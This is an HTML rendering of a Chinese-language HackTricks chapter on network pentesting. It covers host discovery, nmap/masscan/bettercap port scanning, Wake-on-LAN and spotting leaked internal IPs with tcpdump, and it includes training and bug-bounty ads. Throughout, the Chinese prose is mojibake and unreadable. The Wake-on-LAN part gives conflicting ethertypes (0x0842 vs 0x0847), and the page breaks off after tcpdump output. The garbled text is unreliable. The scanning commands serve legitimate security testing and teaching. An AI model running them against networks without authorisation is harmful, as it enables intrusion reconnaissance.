<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentesting Network</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pentesting-network"><a class="header" href="#pentesting-network">Pentesting Network</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<p><img src="../../.gitbook/assets/i3.png" alt="" data-size="original"><br />
<strong>æ¼æ´èµé‡‘æç¤º</strong>ï¼š<strong>æ³¨å†Œ</strong> <strong>Intigriti</strong>ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§ <strong>æ¼æ´èµé‡‘å¹³å°</strong>ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>ï¼Œå¼€å§‹èµšå–é«˜è¾¾ <strong>$100,000</strong> çš„èµé‡‘ï¼</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<h2 id="ä»å¤–éƒ¨å‘ç°ä¸»æœº"><a class="header" href="#ä»å¤–éƒ¨å‘ç°ä¸»æœº">ä»å¤–éƒ¨å‘ç°ä¸»æœº</a></h2>
<p>è¿™å°†æ˜¯ä¸€ä¸ªå…³äºå¦‚ä½•ä» <strong>äº’è”ç½‘</strong> æŸ¥æ‰¾ <strong>å“åº”çš„ IP</strong> çš„ <strong>ç®€è¦éƒ¨åˆ†</strong>ã€‚<br />
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æœ‰ä¸€äº› <strong>IP èŒƒå›´</strong>ï¼ˆç”šè‡³å¯èƒ½æœ‰å¤šä¸ª <strong>èŒƒå›´</strong>ï¼‰ï¼Œæ‚¨åªéœ€æ‰¾å‡º <strong>å“ªäº› IP æ­£åœ¨å“åº”</strong>ã€‚</p>
<h3 id="icmp"><a class="header" href="#icmp">ICMP</a></h3>
<p>è¿™æ˜¯å‘ç°ä¸»æœºæ˜¯å¦åœ¨çº¿çš„ <strong>æœ€ç®€å•</strong> å’Œ <strong>æœ€å¿«</strong> çš„æ–¹æ³•ã€‚<br />
æ‚¨å¯ä»¥å°è¯•å‘é€ä¸€äº› <strong>ICMP</strong> æ•°æ®åŒ…å¹¶ <strong>æœŸå¾…å“åº”</strong>ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯å‘é€ä¸€ä¸ª <strong>å›æ˜¾è¯·æ±‚</strong> å¹¶æœŸå¾…å“åº”ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç®€å•çš„ <code>ping</code> æˆ–ä½¿ç”¨ <code>fping</code> è¿›è¡Œ <strong>èŒƒå›´</strong> æµ‹è¯•ã€‚<br />
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ <strong>nmap</strong> å‘é€å…¶ä»–ç±»å‹çš„ ICMP æ•°æ®åŒ…ï¼ˆè¿™å°†é¿å…å¸¸è§ ICMP å›æ˜¾è¯·æ±‚-å“åº”çš„è¿‡æ»¤å™¨ï¼‰ã€‚</p>
<pre><code class="language-bash">ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
</code></pre>
<h3 id="tcp-port-discovery"><a class="header" href="#tcp-port-discovery">TCP Port Discovery</a></h3>
<p>å¾ˆå¸¸è§çš„æ˜¯ï¼Œæ‰€æœ‰ç±»å‹çš„ ICMP æ•°æ®åŒ…éƒ½è¢«è¿‡æ»¤ã€‚å› æ­¤ï¼Œæ‚¨èƒ½åšçš„å°±æ˜¯ <strong>å°è¯•æŸ¥æ‰¾å¼€æ”¾ç«¯å£</strong>ã€‚æ¯ä¸ªä¸»æœºæœ‰ <strong>65535 ä¸ªç«¯å£</strong>ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæ‚¨æœ‰ä¸€ä¸ªâ€œå¤§çš„â€èŒƒå›´ï¼Œæ‚¨ <strong>æ— æ³•</strong> æµ‹è¯•æ¯ä¸ªä¸»æœºçš„ <strong>æ¯ä¸ªç«¯å£</strong> æ˜¯å¦å¼€æ”¾ï¼Œè¿™å°†èŠ±è´¹å¤ªå¤šæ—¶é—´ã€‚<br />
å› æ­¤ï¼Œæ‚¨éœ€è¦çš„æ˜¯ä¸€ä¸ª <strong>å¿«é€Ÿç«¯å£æ‰«æå™¨</strong> (<a href="https://github.com/robertdavidgraham/masscan">masscan</a>) å’Œä¸€ä¸ª <strong>ä½¿ç”¨æœ€é¢‘ç¹çš„ç«¯å£</strong> åˆ—è¡¨ï¼š</p>
<pre><code class="language-bash">#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
</code></pre>
<p>æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>nmap</code> æ‰§è¡Œæ­¤æ­¥éª¤ï¼Œä½†é€Ÿåº¦è¾ƒæ…¢ï¼Œå¹¶ä¸” <code>nmap</code> åœ¨è¯†åˆ«ä¸»æœºæ—¶å­˜åœ¨ä¸€äº›é—®é¢˜ã€‚</p>
<h3 id="http-ç«¯å£å‘ç°"><a class="header" href="#http-ç«¯å£å‘ç°">HTTP ç«¯å£å‘ç°</a></h3>
<p>è¿™åªæ˜¯ä¸€ä¸ª TCP ç«¯å£å‘ç°ï¼Œå½“æ‚¨æƒ³è¦ <strong>ä¸“æ³¨äºå‘ç° HTTP</strong> <strong>æœåŠ¡</strong> æ—¶éå¸¸æœ‰ç”¨ï¼š</p>
<pre><code class="language-bash">masscan -p80,443,8000-8100,8443 199.66.11.0/24
</code></pre>
<h3 id="udpç«¯å£å‘ç°"><a class="header" href="#udpç«¯å£å‘ç°">UDPç«¯å£å‘ç°</a></h3>
<p>æ‚¨è¿˜å¯ä»¥å°è¯•æ£€æŸ¥æŸäº›<strong>UDPç«¯å£æ˜¯å¦å¼€æ”¾</strong>ï¼Œä»¥å†³å®šæ˜¯å¦åº”è¯¥<strong>æ›´åŠ å…³æ³¨</strong>ä¸€ä¸ª<strong>ä¸»æœº</strong>ã€‚ç”±äºUDPæœåŠ¡é€šå¸¸<strong>ä¸å“åº”</strong>å¸¸è§„ç©ºUDPæ¢æµ‹æ•°æ®åŒ…ï¼Œå› æ­¤å¾ˆéš¾åˆ¤æ–­ç«¯å£æ˜¯è¢«è¿‡æ»¤è¿˜æ˜¯å¼€æ”¾ã€‚å†³å®šè¿™ä¸€ç‚¹çš„æœ€ç®€å•æ–¹æ³•æ˜¯å‘é€ä¸æ­£åœ¨è¿è¡Œçš„æœåŠ¡ç›¸å…³çš„æ•°æ®åŒ…ï¼Œç”±äºæ‚¨ä¸çŸ¥é“æ­£åœ¨è¿è¡Œå“ªä¸ªæœåŠ¡ï¼Œæ‚¨åº”è¯¥æ ¹æ®ç«¯å£å·å°è¯•æœ€å¯èƒ½çš„æœåŠ¡ï¼š</p>
<pre><code class="language-bash">nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
</code></pre>
<p>æè®®çš„ nmap å‘½ä»¤å°†æµ‹è¯•æ¯ä¸ª <strong>/24</strong> èŒƒå›´å†…çš„ <strong>å‰ 1000 ä¸ª UDP ç«¯å£</strong>ï¼Œä½†å³ä½¿ä»…æ­¤ä¹Ÿéœ€è¦ <strong>&gt;20min</strong>ã€‚å¦‚æœéœ€è¦ <strong>æœ€å¿«çš„ç»“æœ</strong>ï¼Œå¯ä»¥ä½¿ç”¨ <a href="https://github.com/portcullislabs/udp-proto-scanner"><strong>udp-proto-scanner</strong></a>ï¼š<code>./udp-proto-scanner.pl 199.66.11.53/24</code> è¿™å°†å‘å…¶ <strong>é¢„æœŸç«¯å£</strong> å‘é€è¿™äº› <strong>UDP æ¢æµ‹</strong>ï¼ˆå¯¹äº /24 èŒƒå›´ï¼Œè¿™åªéœ€ 1 åˆ†é’Ÿï¼‰ï¼š<em>DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp.</em></p>
<h3 id="sctp-ç«¯å£å‘ç°"><a class="header" href="#sctp-ç«¯å£å‘ç°">SCTP ç«¯å£å‘ç°</a></h3>
<pre><code class="language-bash">#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn &lt;IP/range&gt;
</code></pre>
<h2 id="pentesting-wifi"><a class="header" href="#pentesting-wifi">Pentesting Wifi</a></h2>
<p>åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå…³äºæ‰€æœ‰å·²çŸ¥Wifiæ”»å‡»çš„è‰¯å¥½æŒ‡å—ï¼š</p>
<p>{% content-ref url="../pentesting-wifi/" %}
<a href="../pentesting-wifi/">pentesting-wifi</a>
{% endcontent-ref %}</p>
<h2 id="ä»å†…éƒ¨å‘ç°ä¸»æœº"><a class="header" href="#ä»å†…éƒ¨å‘ç°ä¸»æœº">ä»å†…éƒ¨å‘ç°ä¸»æœº</a></h2>
<p>å¦‚æœæ‚¨åœ¨ç½‘ç»œå†…éƒ¨ï¼Œæ‚¨é¦–å…ˆæƒ³è¦åšçš„äº‹æƒ…ä¹‹ä¸€æ˜¯<strong>å‘ç°å…¶ä»–ä¸»æœº</strong>ã€‚æ ¹æ®æ‚¨å¯ä»¥/æƒ³è¦åˆ¶é€ çš„<strong>å™ªéŸ³</strong>ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼š</p>
<h3 id="è¢«åŠ¨"><a class="header" href="#è¢«åŠ¨">è¢«åŠ¨</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å·¥å…·åœ¨è¿æ¥çš„ç½‘ç»œä¸­è¢«åŠ¨å‘ç°ä¸»æœºï¼š</p>
<pre><code class="language-bash">netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
</code></pre>
<h3 id="active"><a class="header" href="#active">Active</a></h3>
<p>è¯·æ³¨æ„ï¼Œåœ¨ <a href="./#discovering-hosts-from-the-outside"><em><strong>ä»å¤–éƒ¨å‘ç°ä¸»æœº</strong></em></a> (<em>TCP/HTTP/UDP/SCTP ç«¯å£å‘ç°</em>) ä¸­æåˆ°çš„æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œ<strong>åº”ç”¨</strong>ã€‚<br />
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨<strong>åŒä¸€ç½‘ç»œ</strong>ä¸­ï¼Œæ‚¨å¯ä»¥åš<strong>æ›´å¤šäº‹æƒ…</strong>ï¼š</p>
<pre><code class="language-bash">#ARP discovery
nmap -sn &lt;Network&gt; #ARP Requests (Discover IPs)
netdiscover -r &lt;Network&gt; #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 &lt;IFACE&gt; # Send a pingv6 to multicast.
</code></pre>
<h3 id="active-icmp"><a class="header" href="#active-icmp">Active ICMP</a></h3>
<p>æ³¨æ„ï¼Œåœ¨ <em>Discovering hosts from the outside</em> (<a href="./#icmp"><em><strong>ICMP</strong></em></a>) ä¸­æåˆ°çš„æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œ<strong>åº”ç”¨</strong>ã€‚<br />
ä½†æ˜¯ï¼Œç”±äºæ‚¨ä¸å…¶ä»–ä¸»æœºåœ¨<strong>åŒä¸€ç½‘ç»œ</strong>ä¸­ï¼Œæ‚¨å¯ä»¥åš<strong>æ›´å¤šäº‹æƒ…</strong>ï¼š</p>
<ul>
<li>å¦‚æœæ‚¨<strong>ping</strong>ä¸€ä¸ª<strong>å­ç½‘å¹¿æ’­åœ°å€</strong>ï¼Œpingåº”è¯¥åˆ°è¾¾<strong>æ¯ä¸ªä¸»æœº</strong>ï¼Œå®ƒä»¬å¯èƒ½ä¼š<strong>å›åº”</strong>æ‚¨ï¼š<code>ping -b 10.10.5.255</code></li>
<li>ping <strong>ç½‘ç»œå¹¿æ’­åœ°å€</strong>ï¼Œæ‚¨ç”šè‡³å¯ä»¥æ‰¾åˆ°<strong>å…¶ä»–å­ç½‘</strong>ä¸­çš„ä¸»æœºï¼š<code>ping -b 255.255.255.255</code></li>
<li>ä½¿ç”¨ <code>-PE</code>ã€<code>-PP</code>ã€<code>-PM</code> æ ‡å¿—çš„ <code>nmap</code> è¿›è¡Œä¸»æœºå‘ç°ï¼Œåˆ†åˆ«å‘é€<strong>ICMPv4 echo</strong>ã€<strong>æ—¶é—´æˆ³</strong>å’Œ<strong>å­ç½‘æ©ç è¯·æ±‚</strong>ï¼š<code>nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24</code></li>
</ul>
<h3 id="wake-on-lan"><a class="header" href="#wake-on-lan"><strong>Wake On Lan</strong></a></h3>
<p>Wake On Lan ç”¨äºé€šè¿‡<strong>ç½‘ç»œæ¶ˆæ¯</strong>æ¥<strong>å¼€å¯</strong>è®¡ç®—æœºã€‚ç”¨äºå¼€å¯è®¡ç®—æœºçš„é­”æœ¯æ•°æ®åŒ…åªæ˜¯ä¸€ä¸ªæä¾›äº†<strong>MAC Dst</strong>çš„åŒ…ï¼Œç„¶ååœ¨åŒä¸€ä¸ªåŒ…ä¸­<strong>é‡å¤16æ¬¡</strong>ã€‚<br />
ç„¶åï¼Œè¿™ç§ç±»å‹çš„æ•°æ®åŒ…é€šå¸¸ä»¥<strong>ä»¥å¤ªç½‘ 0x0842</strong>æˆ–<strong>UDP æ•°æ®åŒ…å‘é€åˆ°ç«¯å£ 9</strong>ã€‚<br />
å¦‚æœ<strong>æœªæä¾› [MAC]</strong>ï¼Œåˆ™æ•°æ®åŒ…å°†å‘é€åˆ°<strong>å¹¿æ’­ä»¥å¤ªç½‘</strong>ï¼ˆå¹¿æ’­ MAC å°†æ˜¯è¢«é‡å¤çš„é‚£ä¸ªï¼‰ã€‚</p>
<pre><code class="language-bash"># Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
</code></pre>
<h2 id="æ‰«æä¸»æœº"><a class="header" href="#æ‰«æä¸»æœº">æ‰«æä¸»æœº</a></h2>
<p>ä¸€æ—¦ä½ å‘ç°äº†æ‰€æœ‰æƒ³è¦æ·±å…¥æ‰«æçš„ IPï¼ˆå¤–éƒ¨æˆ–å†…éƒ¨ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</p>
<h3 id="tcp"><a class="header" href="#tcp">TCP</a></h3>
<ul>
<li><strong>å¼€æ”¾</strong> ç«¯å£: <em>SYN --&gt; SYN/ACK --&gt; RST</em></li>
<li><strong>å…³é—­</strong> ç«¯å£: <em>SYN --&gt; RST/ACK</em></li>
<li><strong>è¿‡æ»¤</strong> ç«¯å£: <em>SYN --&gt; [æ— å“åº”]</em></li>
<li><strong>è¿‡æ»¤</strong> ç«¯å£: <em>SYN --&gt; ICMP æ¶ˆæ¯</em></li>
</ul>
<pre><code class="language-bash"># Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan &lt;IP&gt;
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan &lt;IP&gt;
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan &lt;IP&gt;

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
</code></pre>
<h3 id="udp"><a class="header" href="#udp">UDP</a></h3>
<p>æœ‰ä¸¤ç§é€‰é¡¹æ¥æ‰«æUDPç«¯å£ï¼š</p>
<ul>
<li>å‘é€ä¸€ä¸ª<strong>UDPæ•°æ®åŒ…</strong>å¹¶æ£€æŸ¥å“åº”_<strong>ICMPä¸å¯è¾¾</strong>_ï¼Œå¦‚æœç«¯å£æ˜¯<strong>å…³é—­</strong>çš„ï¼ˆåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼ŒICMPä¼šè¢«<strong>è¿‡æ»¤</strong>ï¼Œå› æ­¤å¦‚æœç«¯å£å…³é—­æˆ–æ‰“å¼€ï¼Œæ‚¨å°†ä¸ä¼šæ”¶åˆ°ä»»ä½•ä¿¡æ¯ï¼‰ã€‚</li>
<li>å‘é€<strong>æ ¼å¼åŒ–çš„æ•°æ®æŠ¥</strong>ä»¥å¼•å‘<strong>æœåŠ¡</strong>çš„å“åº”ï¼ˆä¾‹å¦‚ï¼ŒDNSã€DHCPã€TFTPç­‰ï¼Œå¦‚_nmap-payloads_ä¸­åˆ—å‡ºï¼‰ã€‚å¦‚æœæ‚¨æ”¶åˆ°<strong>å“åº”</strong>ï¼Œé‚£ä¹ˆç«¯å£æ˜¯<strong>å¼€æ”¾</strong>çš„ã€‚</li>
</ul>
<p><strong>Nmap</strong>å°†ä½¿ç”¨â€œ-sVâ€<strong>æ··åˆè¿™ä¸¤ç§</strong>é€‰é¡¹ï¼ˆUDPæ‰«æéå¸¸æ…¢ï¼‰ï¼Œä½†è¯·æ³¨æ„ï¼ŒUDPæ‰«ææ¯”TCPæ‰«ææ…¢ï¼š</p>
<pre><code class="language-bash"># Check if any of the most common udp services is running
udp-proto-scanner.pl &lt;IP&gt;
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 &lt;IP&gt;
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 &lt;IP&gt;
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 &lt;IP&gt;
# You could use nmap to test all the UDP ports, but that will take a lot of time
</code></pre>
<h3 id="sctp-æ‰«æ"><a class="header" href="#sctp-æ‰«æ">SCTP æ‰«æ</a></h3>
<p><strong>SCTP (æµæ§åˆ¶ä¼ è¾“åè®®)</strong> æ—¨åœ¨ä¸ <strong>TCP (ä¼ è¾“æ§åˆ¶åè®®)</strong> å’Œ <strong>UDP (ç”¨æˆ·æ•°æ®æŠ¥åè®®)</strong> ä¸€èµ·ä½¿ç”¨ã€‚å…¶ä¸»è¦ç›®çš„æ˜¯ä¿ƒè¿›é€šè¿‡ IP ç½‘ç»œä¼ è¾“ç”µè¯æ•°æ®ï¼Œåæ˜ å‡ºè®¸å¤šåœ¨ <strong>ä¿¡ä»¤ç³»ç»Ÿ 7 (SS7)</strong> ä¸­å‘ç°çš„å¯é æ€§ç‰¹å¾ã€‚<strong>SCTP</strong> æ˜¯ <strong>SIGTRAN</strong> åè®®æ—çš„æ ¸å¿ƒç»„æˆéƒ¨åˆ†ï¼Œæ—¨åœ¨é€šè¿‡ IP ç½‘ç»œä¼ è¾“ SS7 ä¿¡å·ã€‚</p>
<p>å„ç§æ“ä½œç³»ç»Ÿæä¾›å¯¹ <strong>SCTP</strong> çš„æ”¯æŒï¼Œå¦‚ <strong>IBM AIX</strong>ã€<strong>Oracle Solaris</strong>ã€<strong>HP-UX</strong>ã€<strong>Linux</strong>ã€<strong>Cisco IOS</strong> å’Œ <strong>VxWorks</strong>ï¼Œè¿™è¡¨æ˜å…¶åœ¨ç”µä¿¡å’Œç½‘ç»œé¢†åŸŸçš„å¹¿æ³›æ¥å—å’Œå®ç”¨æ€§ã€‚</p>
<p>nmap æä¾›äº†ä¸¤ç§ä¸åŒçš„ SCTP æ‰«æï¼š <em>-sY</em> å’Œ <em>-sZ</em></p>
<pre><code class="language-bash"># Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan &lt;IP&gt;
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan &lt;IP&gt;
</code></pre>
<h3 id="ids-å’Œ-ips-è§„é¿"><a class="header" href="#ids-å’Œ-ips-è§„é¿">IDS å’Œ IPS è§„é¿</a></h3>
<p>{% content-ref url="ids-evasion.md" %}
<a href="ids-evasion.html">ids-evasion.md</a>
{% endcontent-ref %}</p>
<h3 id="æ›´å¤š-nmap-é€‰é¡¹"><a class="header" href="#æ›´å¤š-nmap-é€‰é¡¹"><strong>æ›´å¤š nmap é€‰é¡¹</strong></a></h3>
<p>{% content-ref url="nmap-summary-esp.md" %}
<a href="nmap-summary-esp.html">nmap-summary-esp.md</a>
{% endcontent-ref %}</p>
<h3 id="æ­ç¤ºå†…éƒ¨-ip-åœ°å€"><a class="header" href="#æ­ç¤ºå†…éƒ¨-ip-åœ°å€">æ­ç¤ºå†…éƒ¨ IP åœ°å€</a></h3>
<p><strong>é…ç½®é”™è¯¯çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å’Œç½‘ç»œè®¾å¤‡</strong> æœ‰æ—¶ä¼šä½¿ç”¨ <strong>éå…¬å¼€æºåœ°å€</strong> å¯¹ç½‘ç»œæ¢æµ‹åšå‡ºå“åº”ã€‚<strong>tcpdump</strong> å¯ç”¨äºè¯†åˆ«åœ¨æµ‹è¯•æœŸé—´ä»ç§æœ‰åœ°å€æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ Kali Linux ä¸Šï¼Œå¯ä»¥åœ¨ <strong>eth2 æ¥å£</strong> ä¸Šæ•è·æ•°æ®åŒ…ï¼Œè¯¥æ¥å£å¯ä»¥ä»å…¬å…±äº’è”ç½‘è®¿é—®ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ‚¨çš„è®¾ç½®ä½äº NAT æˆ–é˜²ç«å¢™åé¢ï¼Œè¿™äº›æ•°æ®åŒ…å¯èƒ½ä¼šè¢«è¿‡æ»¤æ‰ã€‚</p>
<pre><code class="language-bash">tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 &gt; 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
